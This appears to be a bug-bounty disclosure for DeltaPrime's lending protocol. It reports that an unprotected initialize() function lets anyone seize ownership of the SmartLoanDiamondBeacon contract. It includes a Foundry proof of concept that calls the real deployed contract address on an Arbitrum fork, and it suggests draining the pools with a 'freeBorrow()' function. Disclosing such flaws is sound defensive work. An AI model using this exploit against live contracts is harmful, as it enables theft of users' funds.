Target:
https://github.com/DeltaPrimeLabs/deltaprime-primeloans

Vulnerability Details:
DeltaPrime maintains all users’ prime accounts in the pattern of “Proxy+implementation” where each prime account is a proxy pointing to the implementation contract. The implementation contract, i.e., “SmartLoanDiamondBeacon”, adheres to the EIP-2535 standard (Diamond) and can only be managed by the protocol owner. This means that if a malicious user can manage to become the owner of the "SmartLoanDiamondBeacon" contract, he can gain control over all users' Prime accounts.

I did indeed discover such a vulnerability. this vulnerability involves a facet contract called “SmartLoanViewFacet”. This contract includes an “initialize()” function, originally designed to initialize the owner for a new prime account. However, we noticed that a hacker can directly call the “SmartLoanViewFacet::initialize()” function to hijack the owner of the “SmartLoanDiamondBeacon” contract.

With ownership of the “SmartLoanDiamondBeacon” contract, the hacker can arbitrarily modify the functionalities of the implementation for all prime accounts, enabling the hacker to steal all the protocol funds, including the funds in all DeltaPrime lending pools and all Prime Accounts. The estimated total loss is >$50M. For example, the hacker can add a “freeBorrow()” function to borrow all the lending pool funds without any solvency check.

Furthermore, once the owner of the “SmartLoanDiamondBeacon” contract is hijacked, there is no way for DeltaPrime to take it back or mitigate the exploit, which means the protocol is totally controlled by the hacker.



Vulnerability Code:

https://github.com/DeltaPrimeLabs/deltaprime-primeloans/blob/dev/main/contracts/facets/SmartLoanViewFacet.sol#L42


Proof of concept (POC):

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

interface ISmartLoanDiamondBeacon {
    function initialize(address owner) external;
}

contract DeltaPrimePoC is Test {
    address constant SmartLoanDiamondBeacon = 0x62Cf82FB0484aF382714cD09296260edc1DC0c6c;
    address constant maliciousOwner = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4; // Put any attacker address

    function setUp() public {
        vm.createSelectFork(vm.envString("ARB_RPC_URL"), 234980496);
    }

    function test_Initialize_Targets() public {
           ISmartLoanDiamondBeacon(SmartLoanDiamondBeacon).initialize(maliciousOwner);
        }
    }



Result:

![DeltaPrimePoCResult](https://github.com/user-attachments/assets/3436464d-6d50-4440-b657-2adb23f9dbb5)
